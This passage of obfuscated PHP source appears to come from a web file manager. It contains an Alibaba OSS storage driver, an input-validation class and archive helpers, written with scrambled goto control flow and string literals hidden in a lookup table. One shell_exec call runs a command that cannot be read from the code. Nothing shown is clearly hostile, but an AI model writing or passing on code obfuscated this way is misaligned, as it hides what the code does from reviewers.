($b‚àÌâœâï as $c´…–İ·¤¼ => $EäŒÃùâ˜ß) { $AÜÚÇâ¥Ä[] = $EäŒÃùâ˜ß[$b°àİ‚…®¿[28]]; $f‹ã’ßğ ƒ[$c´…–İ·¤¼] = $EäŒÃùâ˜ß[$b°àİ‚…®¿[77]]; } return $this->listAllFiles($fÎ„˜ÉÉ˜, $AÜÚÇâ¥Ä, $f‹ã’ßğ ƒ); } public function canRead($aì²ÛÉÄ·) { $Fİã×çí•ª =& $_SERVER[¢à]; $aìÆŸÉÌ‚¸ = $this->client->getAccessControlPolicy($this->bucket, $aì²ÛÉÄ·); if (!$aìÆŸÉÌ‚¸) { return !1; } return in_array($aìÆŸÉÌ‚¸, array($Fİã×çí•ª[190], $Fİã×çí•ª[191], $Fİã×çí•ª[192])) ? !0 : !1; } public function canWrite($AŠˆöË”’) { $e¾óƒ˜è¶æ =& $_SERVER[¢à]; $B‘ä¤Ê© = $this->client->getAccessControlPolicy($this->bucket, $AŠˆöË”’); if (!$B‘ä¤Ê©) { return !1; } return in_array($B‘ä¤Ê©, array($e¾óƒ˜è¶æ[190], $e¾óƒ˜è¶æ[191])) ? !0 : !1; } public function getContent($f—Û†Ø±“…) { return $this->client->getObject($this->bucket, $f—Û†Ø±“…); } public function setContent($C×Á„„¹±, $E”©Æ»£Ó = '', $EçÑÂõç­ = false) { goto BİíƒÚí…; BİíƒÚí…: $cÂ‘÷ñËÀ¯ =& $_SERVER[¢à]; $C×Á„„¹± = $EçÑÂõç­ ? trim($C×Á„„¹±, $cÂ‘÷ñËÀ¯[8]) . $cÂ‘÷ñËÀ¯[8] : $C×Á„„¹±; $EÈ„·šÆ¢ = get_file_mime(get_path_ext($C×Á„„¹±)); goto CâìÓáˆÑ˜; c°ãäæóÚà: $E÷×Á†Êæ¼ = $this->copyFile($C×Á„„¹±, $C×Á„„¹±, array($cÂ‘÷ñËÀ¯[193] => $E÷×Á†Êæ¼[$cÂ‘÷ñËÀ¯[194]])); return $E÷×Á†Êæ¼ ? !0 : !1; goto d¬Öœ©í§É; CâìÓáˆÑ˜: $E÷×Á†Êæ¼ = $this->client->putObject($E”©Æ»£Ó, $this->bucket, $C×Á„„¹±, $cÂ‘÷ñËÀ¯[182], array(), $EÈ„·šÆ¢); if (!$E÷×Á†Êæ¼) { return !1; } if ($EçÑÂõç­) { return !0; } goto c°ãäæóÚà; d¬Öœ©í§É: } public function fileSubstr($FƒÑğ‰¶š·, $F½×ŞÙ­‡½, $A†‰ŠÏÍœš) { $E‹Ğ•ĞÎê† = $F½×ŞÙ­‡½ + $A†‰ŠÏÍœš - 1; return $this->client->getObject($this->bucket, $FƒÑğ‰¶š·, array($_SERVER[¢à][195] => "\x62\171\164\x65\163\x3d{$F½×ŞÙ­‡½}\55{$E‹Ğ•ĞÎê†}")); } public function upload($e¤¥éğ±, $bõ†§¢ÈÊ, $CÚ…®ã¦°º = false, $Aƒ¸à­äÊÓ = REPEAT_REPLACE) { $AÎÜ¹‰ˆåÑ =& $_SERVER[¢à]; $e™ùˆœ†§¾ = array($AÎÜ¹‰ˆåÑ[193] => @md5_file($bõ†§¢ÈÊ)); $d±£·İœÚ‡ = array($AÎÜ¹‰ˆåÑ[196] => get_file_mime(get_path_ext($e¤¥éğ±))); if (IO::size($bõ†§¢ÈÊ) <= 1024 * 1024 * 200) { $dïÊæöˆöŞ = $this->client->putObjectFile($bõ†§¢ÈÊ, $this->bucket, $e¤¥éğ±, $AÎÜ¹‰ˆåÑ[182], $e™ùˆœ†§¾, $d±£·İœÚ‡); return !empty($dïÊæöˆöŞ) ? $this->getPathOuter($e¤¥éğ±) : !1; } $AÜæÍõ¡Æš = $this->client->multiUploadObject($bõ†§¢ÈÊ, $this->bucket, trim($e¤¥éğ±, $AÎÜ¹‰ˆåÑ[8]), $e™ùˆœ†§¾, $d±£·İœÚ‡); return $AÜæÍõ¡Æš ? $this->getPathOuter($e¤¥éğ±) : !1; } public function download($eëíáÇ™»©, $DÂ˜‘ß†¥) { if (!@is_dir($this->pathFather($DÂ˜‘ß†¥)) && !IO::mkdir($this->pathFather($DÂ˜‘ß†¥))) { return !1; } $F„ëÉÌ„£å = $this->client->getObject($this->bucket, $eëíáÇ™»©, array(), $DÂ˜‘ß†¥); return $F„ëÉÌ„£å !== !1 ? $DÂ˜‘ß†¥ : !1; } public function link($eƒëŒ‰æ†Ğ, $Eõ“ÕÛ·ğó = array()) { $EíÁÈÉÔ„¥ =& $_SERVER[¢à]; if ($this->signVer == $EíÁÈÉÔ„¥[197]) { return $this->client->getAuthenticatedURL($this->bucket, $eƒëŒ‰æ†Ğ, 3600 * 12, $Eõ“ÕÛ·ğó); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($eƒëŒ‰æ†Ğ, $EíÁÈÉÔ„¥[8]), 3600 * 12, $this->region, array(), !0, $Eõ“ÕÛ·ğó); } public function fileOut($Có²Ö ˆÏà, $AˆÓ¡Ôó¦Ú = false, $Cñºä“öÇ§ = false, $f¥ïá«±ÚÇ = '') { goto b…®Õ½¤ªˆ; b¬ôØª¨Î: $dğ£èá¼²Ø = $this->link($Có²Ö ˆÏà, $f¾„îß­¼ˆ); $this->fileOutLink($dğ£èá¼²Ø); goto e¦‰ÙÌù³¿; d¿…íÔ–‡²: if ($F‚áåª¿­ == $Bº¢‡²Íó‚[198]) { return parent::fileOut($Có²Ö ˆÏà, $AˆÓ¡Ôó¦Ú, $Cñºä“öÇ§, $f¥ïá«±ÚÇ); } $AˆÓ¡Ôó¦Ú = $AˆÓ¡Ôó¦Ú ? $Bº¢‡²Íó‚[199] : $Bº¢‡²Íó‚[200]; $f¾„îß­¼ˆ = array($Bº¢‡²Íó‚[201] => $AˆÓ¡Ôó¦Ú . $Bº¢‡²Íó‚[202] . rawurlencode($Cñºä“öÇ§), $Bº¢‡²Íó‚[203] => $F‚áåª¿­); goto b¬ôØª¨Î; b…®Õ½¤ªˆ: $Bº¢‡²Íó‚ =& $_SERVER[¢à]; if (!$Cñºä“öÇ§) { $Cñºä“öÇ§ = $this->pathThis($Có²Ö ˆÏà); } $F‚áåª¿­ = get_file_mime(get_path_ext($Cñºä“öÇ§)); goto d¿…íÔ–‡²; e¦‰ÙÌù³¿: } public function fileOutServer($b±ƒá­®È‚, $E÷¬‚†Š = false, $B‘¡»Áë¥ù = false, $DËÁ¬…ó‡ = '') { parent::fileOut($b±ƒá­®È‚, $E÷¬‚†Š, $B‘¡»Áë¥ù, $DËÁ¬…ó‡); } public function fileOutImage($cğëÆ«šğÇ, $fùˆÛŞÇ = 250) { $cµ°ğ”ÈÜµ = $this->link($cğëÆ«šğÇ); $this->fileOutLink($cµ°ğ”ÈÜµ); } public function fileOutImageServer($A–×ò¿–©Ê, $EèÅ“²šæ» = 250) { parent::fileOutImage($A–×ò¿–©Ê, $EèÅ“²šæ»); } public function hashMd5($EİÆ’ÕÄ‚Ó, $dÙã»˜ÙŠ = '') { $aÌÑÜ®Òå =& $_SERVER[¢à]; $aÇ¬¦éµæõ = $this->objectMeta($EİÆ’ÕÄ‚Ó); if (!$aÇ¬¦éµæõ) { return !1; } $dÙã»˜ÙŠ = $dÙã»˜ÙŠ ? $dÙã»˜ÙŠ : _get($aÇ¬¦éµæõ, $aÌÑÜ®Òå[204]); $dÙã»˜ÙŠ = $dÙã»˜ÙŠ ? $dÙã»˜ÙŠ : _get($aÇ¬¦éµæõ, $aÌÑÜ®Òå[194], $aÌÑÜ®Òå[33]); return $dÙã»˜ÙŠ; } public function uploadFormData($CÕ–ƒÎñ÷, $EŸ†Ú—š» = 3600) { $dñÆ­ãĞÒÁ =& $_SERVER[¢à]; $E‹Ìˆ¸åŒè = $this->pathFather($CÕ–ƒÎñ÷); $C–ù”Ş†Ûò = $this->client->getHttpUploadPostParams($this->bucket, $E‹Ìˆ¸åŒè, $dñÆ­ãĞÒÁ[182], $EŸ†Ú—š»); return array_merge((array) $C–ù”Ş†Ûò, array($dñÆ­ãĞÒÁ[166] => $this->getHost())); } public function multiUploadFormData($d…´ƒ‹šª›, $d³ƒŒà¿ùÒ = 3600) { $EœŠã­‘ë =& $_SERVER[¢à]; $dÚ§˜Õ™Êæ = gmdate($EœŠã­‘ë[205]); $d Œªèò = array(); $eŒ²¿Ş˜ù = $this->client->getUploadId($this->bucket, $d…´ƒ‹šª›, $d Œªèò); if (!$eŒ²¿Ş˜ù) { return !1; } return array($EœŠã­‘ë[206] => $eŒ²¿Ş˜ù, $EœŠã­‘ë[166] => $this->getHost() . $EœŠã­‘ë[8] . $this->pathEncode($d…´ƒ‹šª›), $EœŠã­‘ë[207] => $dÚ§˜Õ™Êæ, $EœŠã­‘ë[89] => $d…´ƒ‹šª›); } public function multiUploadAuthData($FÓ¬òØƒö, $FÔñõƒ‰»Ó = array()) { goto Eˆ¦œÈÎ©; BÖ¹”÷Ì¼É: $FÊˆÃå×ÑÑ = array($dËØœÁ£ŠÃ[209], $dËØœÁ£ŠÃ[33], $dËØœÁ£ŠÃ[116], $dËØœÁ£ŠÃ[33], "\170\x2d\x61\155\172\55\144\x61\x74\145\x3a{$Có±ï•ÉÎ}", $dËØœÁ£ŠÃ[8] . $this->bucket . $dËØœÁ£ŠÃ[8] . $this->pathEncode($f‚–ĞˆóÕ¹) . $a³ó‘©×®¿); if (strpos($a³ó‘©×®¿, $dËØœÁ£ŠÃ[210]) === 0) { $FÊˆÃå×ÑÑ[0] = $dËØœÁ£ŠÃ[211]; } if (isset($FÔñõƒ‰»Ó[$dËØœÁ£ŠÃ[212]]) && $FÔñõƒ‰»Ó[$dËØœÁ£ŠÃ[212]] == $dËØœÁ£ŠÃ[213]) { $FÊˆÃå×ÑÑ[0] = $dËØœÁ£ŠÃ[213]; } goto bš”ğŒ›ˆ‡; bš”ğŒ›ˆ‡: $e´õ¨‚»Ş = implode($dËØœÁ£ŠÃ[214], $FÊˆÃå×ÑÑ); $D¸ÉŒŒ„ó = base64_encode(hash_hmac($dËØœÁ£ŠÃ[215], $e´õ¨‚»Ş, $this->secret, !0)); $b¨¯¶¬Š®œ = $dËØœÁ£ŠÃ[216] . $this->accessKey . $dËØœÁ£ŠÃ[4] . $D¸ÉŒŒ„ó; goto aÅ‡îäºŸİ; aÅ‡îäºŸİ: if (strpos($a³ó‘©×®¿, $dËØœÁ£ŠÃ[210]) === 0) { return array($dËØœÁ£ŠÃ[217] => $b¨¯¶¬Š®œ, $dËØœÁ£ŠÃ[207] => $Có±ï•ÉÎ); } return $b¨¯¶¬Š®œ; goto bÈÒ¾óâç¾; EÔ®©ÕÍÇô: $f‚–ĞˆóÕ¹ = $FÔñõƒ‰»Ó[$dËØœÁ£ŠÃ[89]]; unset($FÔñõƒ‰»Ó[$dËØœÁ£ŠÃ[89]]); if (isset($FÔñõƒ‰»Ó[$dËØœÁ£ŠÃ[208]])) { $FÔñõƒ‰»Ó[$dËØœÁ£ŠÃ[207]] = $Có±ï•ÉÎ; return $this->listUploadParts($f‚–ĞˆóÕ¹, $FÔñõƒ‰»Ó); } goto BÖ¹”÷Ì¼É; Eˆ¦œÈÎ©: $dËØœÁ£ŠÃ =& $_SERVER[¢à]; $Có±ï•ÉÎ = isset($FÔñõƒ‰»Ó[$dËØœÁ£ŠÃ[207]]) ? $FÔñõƒ‰»Ó[$dËØœÁ£ŠÃ[207]] : gmdate($dËØœÁ£ŠÃ[205]); $a³ó‘©×®¿ = isset($FÔñõƒ‰»Ó[$dËØœÁ£ŠÃ[157]]) ? $FÔñõƒ‰»Ó[$dËØœÁ£ŠÃ[157]] : $dËØœÁ£ŠÃ[33]; goto EÔ®©ÕÍÇô; bÈÒ¾óâç¾: } public function listUploadParts($Dºï°İíöİ, $F¯ãè‡âéè = array()) { goto eÄ†äåŒßÌ; D’„‹É‰ØŸ: if (!$cä÷¡Õ„…ˆ) { return !1; } unset($F¯ãè‡âéè[$C‚‡Ó™¡¢‰[208]], $F¯ãè‡âéè[$C‚‡Ó™¡¢‰[212]]); $F¯ãè‡âéè[$C‚‡Ó™¡¢‰[89]] = $Dºï°İíöİ; goto aò¡Ù²õƒ; eÄ†äåŒßÌ: $C‚‡Ó™¡¢‰ =& $_SERVER[¢à]; $bø†õšÈÕµ = str_replace($C‚‡Ó™¡¢‰[218], $C‚‡Ó™¡¢‰[33], $F¯ãè‡âéè[$C‚‡Ó™¡¢‰[157]]); $cä÷¡Õ„…ˆ = $this->client->listParts($this->bucket, $Dºï°İíöİ, $bø†õšÈÕµ); goto D’„‹É‰ØŸ; aò¡Ù²õƒ: $a™ß”ŞŒ÷ = $this->multiUploadAuthData($Dºï°İíöİ, $F¯ãè‡âéè); if (empty($a™ß”ŞŒ÷)) { return !1; } return array($C‚‡Ó™¡¢‰[217] => $a™ß”ŞŒ÷, $C‚‡Ó™¡¢‰[207] => $F¯ãè‡âéè[$C‚‡Ó™¡¢‰[207]], $C‚‡Ó™¡¢‰[219] => $cä÷¡Õ„…ˆ); goto AÆÊ„àˆİ‘; AÆÊ„àˆİ‘: } public function getHost() { return parent::getHost() . $_SERVER[¢à][8] . $this->bucket; } public function size($aĞ§µÒ–) { $AôãòÂø„ = $this->objectMeta($aĞ§µÒ–); return $AôãòÂø„ ? $AôãòÂø„[$_SERVER[¢à][77]] : 0; } public function info($bË˜‚•ñ“Ù) { if ($this->isFolder($bË˜‚•ñ“Ù)) { return $this->folderInfo($bË˜‚•ñ“Ù); } else { if ($this->isFile($bË˜‚•ñ“Ù)) { return $this->fileInfo($bË˜‚•ñ“Ù); } } return !1; } public function exist($bØœ—¤Û÷) { return $this->isFile($bØœ—¤Û÷) || $this->isFolder($bØœ—¤Û÷); } public function isFile($F§ÄšŠ) { return !$this->isFolder($F§ÄšŠ) && $this->objectMeta($F§ÄšŠ); } public function isFolder($BÔƒßĞõİ) { return $this->cacheMethod($_SERVER[¢à][220], $BÔƒßĞõİ); } protected function objectMeta($A×‘®¤ÉÈ) { return $this->cacheMethod($_SERVER[¢à][221], $A×‘®¤ÉÈ); } protected function _objectMeta($f–ÖÔÇ‘Ûì) { $Eë¼·‡ç­ß =& $_SERVER[¢à]; $f–ÖÔÇ‘Ûì = rtrim($f–ÖÔÇ‘Ûì, $Eë¼·‡ç­ß[8]); try { $BØÏìÜİÍÌ = $this->client->getObjectInfo($this->bucket, $f–ÖÔÇ‘Ûì); if (!isset($BØÏìÜİÍÌ[$Eë¼·‡ç­ß[204]]) && isset($BØÏìÜİÍÌ[$Eë¼·‡ç­ß[222]])) { $BØÏìÜİÍÌ[$Eë¼·‡ç­ß[204]] = $BØÏìÜİÍÌ[$Eë¼·‡ç­ß[222]]; } } catch (OSS\Core\OssException $BËÔîììë†) { $BØÏìÜİÍÌ = !1; } if (!$BØÏìÜİÍÌ) { } return $BØÏìÜİÍÌ; } protected function _isFolder($eâ·„™Ï’ê) { goto B›ÎØÌö¯×; EŠõ±ë®‡: if (substr($a­×ªƒïÛ°[0][$B””Ÿ•çµ«[28]], -1) == $B””Ÿ•çµ«[8]) { return !0; } if (get_path_this($a­×ªƒïÛ°[0][$B””Ÿ•çµ«[28]]) == get_path_this($eâ·„™Ï’ê)) { return !1; } return !0; goto E¡Œœò…´Ñ; B›ÎØÌö¯×: $B””Ÿ•çµ« =& $_SERVER[¢à]; $eâ·„™Ï’ê = rtrim($eâ·„™Ï’ê, $B””Ÿ•çµ«[8]); if ($eâ·„™Ï’ê == $B””Ÿ•çµ«[33] || $eâ·„™Ï’ê == $B””Ÿ•çµ«[8]) { return !0; } goto f¼‘ïí¨¡; f¼‘ïí¨¡: $a­×ªƒïÛ° = $this->client->getBucket($this->bucket, $eâ·„™Ï’ê, null, 1); if (empty($a­×ªƒïÛ°)) { return !1; } $a­×ªƒïÛ° = array_values($a­×ªƒïÛ°); goto EŠõ±ë®‡; E¡Œœò…´Ñ: } } define($_SERVER[¢à][223], 1); goto BÍƒ¿‹åÄ¼; cÄÙí˜´Æé: if (!function_exists($_SERVER[¢à][1847])) { function imagecreatefrombmp($bŒ­Ş—ôµ) { return ImageGdBMP::load($bŒ­Ş—ôµ); } } class Input { public static function getArray($D·¦êê‚Šç) { goto c–ò¬­¢Î—; c–ò¬­¢Î—: $CÏ”æá×‡œ =& $_SERVER[¢à]; global $in; $eœ¯•™’î = array(); goto BøœÆî÷ÍÅ; cíÑ‰¸â¿Â: if (count($e˜ùÆÛÃ) > 0) { show_json(implode($CÏ”æá×‡œ[1852], $e˜ùÆÛÃ), !1); } return $eœ¯•™’î; goto C¹½Ùß³–‹; BøœÆî÷ÍÅ: $e˜ùÆÛÃ = array(); $A©äİš²ã× = LNG($CÏ”æá×‡œ[1848]); foreach ($D·¦êê‚Šç as $Eœá˜óõ‰ø => $EªœÚ½î) { goto DÌ¸Éó™„; DÌ¸Éó™„: $a§¥»Ê’¨Ÿ = _get($EªœÚ½î, $CÏ”æá×‡œ[1235], $A©äİš²ã× . $CÏ”æá×‡œ[878] . $Eœá˜óõ‰ø); $EØŒÃ¤›ù = $Eœá˜óõ‰ø; if (isset($EªœÚ½î[$CÏ”æá×‡œ[1849]]) && $EªœÚ½î[$CÏ”æá×‡œ[1849]]) { $EØŒÃ¤›ù = $EªœÚ½î[$CÏ”æá×‡œ[1849]]; } goto eøîƒ˜ Æ; eøîƒ˜ Æ: if (!array_key_exists($Eœá˜óõ‰ø, $in)) { if (array_key_exists($CÏ”æá×‡œ[1850], $EªœÚ½î)) { if (!is_null($EªœÚ½î[$CÏ”æá×‡œ[1850]])) { $eœ¯•™’î[$EØŒÃ¤›ù] = $EªœÚ½î[$CÏ”æá×‡œ[1850]]; } } else { if (isset($EªœÚ½î[$CÏ”æá×‡œ[1851]])) { $e˜ùÆÛÃ[] = $a§¥»Ê’¨Ÿ; } } continue; } if (isset($EªœÚ½î[$CÏ”æá×‡œ[1851]]) && $EªœÚ½î[$CÏ”æá×‡œ[1851]] == $CÏ”æá×‡œ[279]) { $c²¾ïîÖˆÂ = json_decode($in[$Eœá˜óõ‰ø], !0); if (is_array($c²¾ïîÖˆÂ)) { $eœ¯•™’î[$EØŒÃ¤›ù] = $c²¾ïîÖˆÂ; } else { if (array_key_exists($CÏ”æá×‡œ[1850], $EªœÚ½î)) { if (!is_null($EªœÚ½î[$CÏ”æá×‡œ[1850]])) { $eœ¯•™’î[$EØŒÃ¤›ù] = $EªœÚ½î[$CÏ”æá×‡œ[1850]]; } } else { $e˜ùÆÛÃ[] = $a§¥»Ê’¨Ÿ; } } continue; } $a‚ñ„ÃÆŸ÷ = _get($EªœÚ½î, $CÏ”æá×‡œ[1007]); goto FÍĞ±Âåî; FÍĞ±Âåî: if (isset($EªœÚ½î[$CÏ”æá×‡œ[1851]]) && !self::check($in[$Eœá˜óõ‰ø], $EªœÚ½î[$CÏ”æá×‡œ[1851]], $a‚ñ„ÃÆŸ÷)) { if (array_key_exists($CÏ”æá×‡œ[1850], $EªœÚ½î)) { if (!is_null($EªœÚ½î[$CÏ”æá×‡œ[1850]])) { $eœ¯•™’î[$EØŒÃ¤›ù] = $EªœÚ½î[$CÏ”æá×‡œ[1850]]; } } else { $e˜ùÆÛÃ[] = $a§¥»Ê’¨Ÿ; } continue; } $eœ¯•™’î[$EØŒÃ¤›ù] = $in[$Eœá˜óõ‰ø]; goto F¿Îß¯öğƒ; F¿Îß¯öğƒ: } goto cíÑ‰¸â¿Â; C¹½Ùß³–‹: } public static function reg($D²—¶îÁ¯† = "\x72\x65\161\165\151\162\145") { static $F¥†°§Â° = array("\x72\145\x71\165\x69\x72\x65" => "\x2e\x2b", "\x6e\x75\x6d\x62\x65\162" => "\134\x64\x2b", "\150\145\170" => "\x5b\60\x2d\x39\101\x2d\106\141\55\146\135\x2b", "\x69\x6e\164" => "\x5b\55\134\53\x5d\77\x5c\x64\53", "\x62\157\x6f\x6c" => "\60\x7c\61", "\146\x6c\x6f\x61\x74" => "\133\x2d\x5c\x2b\x5d\x3f\x5c\144\53\x28\x5c\56\134\144\x2b\x29\x3f", "\x65\156\x67\x6c\x69\x73\150" => "\133\x41\x2d\132\x61\55\x7a\40\135\53", "\143\x68\x69\156\x65\163\x65" => "\x5b\134\x78\173\64\145\60\x30\x7d\55\134\x78\x7b\x39\x66\141\65\x7d\x5d\53", "\x68\x61\x73\x43\150\x69\156\x65\163\x65" => "\x2f\50\133\x5c\x78\173\x34\145\60\x30\x7d\55\x5c\170\173\x39\x66\141\x35\x7d\135\x2b\51\x2f\x75", "\145\155\x61\x69\x6c" => "\134\x77\x2b\x28\x5b\134\x2e\x5c\55\x5d\134\167\x2b\x29\x2a\134\x40\134\167\x2b\50\x5b\x5c\56\134\x2d\x5d\134\167\x2b\51\x2a\134\56\x5c\x77\53", "\x70\150\x6f\x6e\x65" => "\61\x5b\x33\55\x39\x5d\134\144\173\71\175", "\x74\145\x6c\160\x68\x6f\156\x65" => "\50\x5c\50\134\144\173\63\54\x34\x7d\x5c\51\174\134\x64\173\63\x2c\x34\175\55\x7c\x5c\x73\x29\77\134\x64\x7b\x37\54\61\x34\175", "\x75\162\154" => "\50\150\x74\x74\160\x7c\x66\x74\x70\174\150\x74\x74\160\x73\51\72\134\x2f\x5c\x2f\x5b\x5c\167\x5c\55\137\135\x2b\50\x5c\x2e\133\134\167\134\x2d\x5f\135\53\51\53\50\x5b\x5c\167\134\55\134\x2e\54\100\77\x5e\75\x25\x26\x3a\x5c\57\176\x5c\53\43\135\x2a\133\134\x77\134\55\134\x40\x3f\x5e\75\x25\46\x5c\57\176\x5c\x2b\x23\135\51\77", "\x75\x72\154\x46\x75\154\154" => "\133\x61\55\172\101\55\x7a\135\x2b\x3a\x5c\57\134\x2f\x5b\x5e\134\x73\135\52", "\x69\x70" => "\x28\x5c\x64\173\61\54\63\x7d\134\x2e\51\173\63\x7d\x28\134\x64\173\61\x2c\x33\175\x29", "\x7a\x69\160" => "\133\61\x2d\71\135\x5c\x64\173\65\x7d\50\77\x21\x5c\x64\x29", "\151\x64\103\141\x72\144" => "\50\x5c\x64\173\x31\x35\x7d\x29\174\50\134\x64\173\61\x37\x7d\50\x5c\144\174\130\x7c\170\x29\x29", "\x63\157\154\x6f\162" => "\43\x28\133\x30\x2d\x39\101\55\106\x61\55\x66\135\x7b\63\175\174\133\60\55\71\x41\x2d\x46\x61\x2d\146\135\173\66\175\51", "\164\x69\155\145" => "\x28\x5b\x30\55\61\135\x5c\x64\x7c\62\x5b\x30\55\64\x5d\x29\x3a\133\60\55\x35\135\134\144", "\x64\141\164\x65" => "\x5c\x64\173\64\175\x5b\x2d\134\57\x5d\x3f\x28\x30\133\x31\55\71\135\x7c\61\133\60\55\x32\x5d\51\133\55\x5c\57\135\x3f\x28\133\60\55\x32\x5d\x5c\144\174\63\133\x30\x2d\61\135\x29", "\144\141\164\145\x54\151\155\x65" => "\134\144\173\64\175\x5b\x2d\134\57\x5d\x3f\50\60\x5b\61\x2d\x39\135\174\x31\133\60\55\62\135\51\133\x2d\x5c\x2f\x5d\x3f\x28\133\60\x2d\x32\135\134\x64\174\63\x5b\x30\55\61\x5d\51\134\x73\53\50\133\60\55\x31\x5d\134\144\174\x32\133\x30\x2d\64\x5d\x29\72\x5b\x30\55\x35\135\134\x64", "\160\x61\x73\163\167\x6f\162\x64" => "\50\x3f\75\x2e\x2a\x5c\x64\51\50\x3f\x3d\x2e\52\x5b\x61\55\172\x5d\x29\50\x3f\x3d\56\52\133\101\x2d\x5a\x5d\51\x2e\173\70\54\62\x30\x7d", "\153\x65\x79" => "\133\101\x2d\x5a\141\55\172\x30\55\71\137\x5c\x2d\x5c\x2e\135\x2b", "\153\145\171\x46\x75\154\154" => "\133\x41\x2d\x5a\141\55\172\60\55\x39\x5f\134\55\134\x2e\x5c\x73\x2c\135\53"); if (!$D²—¶îÁ¯†) { return $F¥†°§Â°; } return $F¥†°§Â°[$D²—¶îÁ¯†]; } public static function check($bîô†º©ĞÃ, $Få©ãÎÓè, $AŞ¬«³ğõğ = null) { $a…˜›—¥º =& $_SERVER[¢à]; switch ($Få©ãÎÓè) { case $a…˜›—¥º[7]: return in_array($bîô†º©ĞÃ, $AŞ¬«³ğõğ); break; case $a…˜›—¥º[1853]: return floatval($bîô†º©ĞÃ) > $AŞ¬«³ğõğ; break; case $a…˜›—¥º[1854]: return floatval($bîô†º©ĞÃ) < $AŞ¬«³ğõğ; break; case $a…˜›—¥º[322]: return strlen($bîô†º©ĞÃ) >= $AŞ¬«³ğõğ[0] && strlen($bîô†º©ĞÃ) <= $AŞ¬«³ğõğ[1]; break; case $a…˜›—¥º[322]: if (is_array($AŞ¬«³ğõğ)) { return strlen($bîô†º©ĞÃ) >= $AŞ¬«³ğõğ[0] && strlen($bîô†º©ĞÃ) <= $AŞ¬«³ğõğ[1]; break; } else { return strlen($bîô†º©ĞÃ) == $AŞ¬«³ğõğ; break; } case $a…˜›—¥º[318]: return floatval($bîô†º©ĞÃ) >= $AŞ¬«³ğõğ[0] && floatval($bîô†º©ĞÃ) <= $AŞ¬«³ğõğ[1]; break; } $C‰Ú‹¥ñ‰„ = self::reg(!1); $Få©ãÎÓè = isset($C‰Ú‹¥ñ‰„[$Få©ãÎÓè]) ? $C‰Ú‹¥ñ‰„[$Få©ãÎÓè] : $Få©ãÎÓè; if (substr($Få©ãÎÓè, 0, 1) != $a…˜›—¥º[8]) { $Få©ãÎÓè = $a…˜›—¥º[1855] . $Få©ãÎÓè . $a…˜›—¥º[1856]; } return preg_match($Få©ãÎÓè, $bîô†º©ĞÃ) === 1; } public static function get($Fà°äªÈĞé, $D‡ßõÎ¦ = null, $aï ¦ê¾æ® = null, $eƒó¶¹±æ = null) { goto fŒ…ñÆ‡Œ; DÇŸŸ‰÷»ğ: return $DÖÃĞÖ…Š¿[$Fà°äªÈĞé]; goto Aìè´èÌ®™; f©§İ˜¾: if (!is_null($eƒó¶¹±æ)) { $b×Ù¹ÈìÊˆ[$Dâê‚ñ™Ü[1007]] = $eƒó¶¹±æ; } if (!is_null($D‡ßõÎ¦)) { $b×Ù¹ÈìÊˆ[$Dâê‚ñ™Ü[1851]] = $D‡ßõÎ¦; } $DÖÃĞÖ…Š¿ = Input::getArray(array($Fà°äªÈĞé => $b×Ù¹ÈìÊˆ)); goto DÇŸŸ‰÷»ğ; fŒ…ñÆ‡Œ: $Dâê‚ñ™Ü =& $_SERVER[¢à]; $b×Ù¹ÈìÊˆ = array(); if (!is_null($aï ¦ê¾æ®)) { $b×Ù¹ÈìÊˆ[$Dâê‚ñ™Ü[34]] = $aï ¦ê¾æ®; } goto f©§İ˜¾; Aìè´èÌ®™: } } class KodArchive { static function init() { goto C¶Üâîìêã; C‡ó‰Ş¸ğ: require_once ARCHIVE_LIB . $E¢¦ãŸÜ„ [1865]; require_once ARCHIVE_LIB . $E¢¦ãŸÜ„ [1866]; require_once ARCHIVE_LIB . $E¢¦ãŸÜ„ [1867]; goto dº«”Ç“…¢; Bˆ¤Ù‹³Æ³: define($E¢¦ãŸÜ„ [1859], TEMP_FILES); define($E¢¦ãŸÜ„ [1860], TEMP_FILES); define($E¢¦ãŸÜ„ [1861], $E¢¦ãŸÜ„ [1862]); goto c¢ê¤‰Ö†İ; c¢ê¤‰Ö†İ: mk_dir(TEMP_FILES); require_once ARCHIVE_LIB . $E¢¦ãŸÜ„ [1863]; require_once ARCHIVE_LIB . $E¢¦ãŸÜ„ [1864]; goto C‡ó‰Ş¸ğ; C¶Üâîìêã: $E¢¦ãŸÜ„  =& $_SERVER[¢à]; if (defined($E¢¦ãŸÜ„ [1857])) { return; } define($E¢¦ãŸÜ„ [1857], SDK_DIR . $E¢¦ãŸÜ„ [1858]); goto Bˆ¤Ù‹³Æ³; dº«”Ç“…¢: require_once ARCHIVE_LIB . $E¢¦ãŸÜ„ [1868]; goto DÕØÚ‡Æãé; DÕØÚ‡Æãé: } static function checkIfType($B†»ÁïªÖõ, $e˜è÷…®íŠ) { goto EÔšÇä¥ïĞ; Bİ«ğ†É™’: $CİÜî…ÄÜÏ = in_array($B†»ÁïªÖõ, $Cœ«ß˜òí’[$e˜è÷…®íŠ]); if ($CİÜî…ÄÜÏ && ($e˜è÷…®íŠ == $a‚¨Â†Š½¥[298] || $e˜è÷…®íŠ == $a‚¨Â†Š½¥[1872]) && (!function_exists($a‚¨Â†Š½¥[1880]) || !function_exists($a‚¨Â†Š½¥[1881]))) { show_tips($a‚¨Â†Š½¥[1882]); } if ($CİÜî…ÄÜÏ && $e˜è÷…®íŠ == $a‚¨Â†Š½¥[1041] && (!function_exists($a‚¨Â†Š½¥[1883]) || !strstr(shell_exec($a‚¨Â†Š½¥[1884]), $a‚¨Â†Š½¥[1885]))) { show_tips($a‚¨Â†Š½¥[1886]); } goto dŠé”ØŠÙ©; EÔšÇä¥ïĞ: $a‚¨Â†Š½¥ =& $_SERVER[¢à]; self::init(); $Cœ«ß˜òí’ = array($a‚¨Â†Š½¥[298] => array($a‚¨Â†Š½¥[298], $a‚¨Â†Š½¥[1869], $a‚¨Â†Š½¥[1870], $a‚¨Â†Š½¥[1871]), $a‚¨Â†Š½¥[1872] => array($a‚¨Â†Š½¥[1872], $a‚¨Â†Š½¥[1873], $a‚¨Â†Š½¥[1039], $a‚¨Â†Š½¥[1037]), $a‚¨Â†Š½¥[1041] => array($a‚¨Â†Š½¥[1041], $a‚¨Â†Š½¥[1874], $a‚¨Â†Š½¥[1875], $a‚¨Â†Š½¥[1876], $a‚¨Â†Š½¥[1877], $a‚¨Â†Š½¥[1878], $a‚¨Â†Š½¥[1879])); goto Bİ«ğ†É™’; dŠé”ØŠÙ©: return $CİÜî…ÄÜÏ; goto c‡±ŒÖ“; c‡±ŒÖ“: } static function listContent($cÜŠĞŞçä¤, $a¤Ä¶ŞˆÖ¢ = true) { 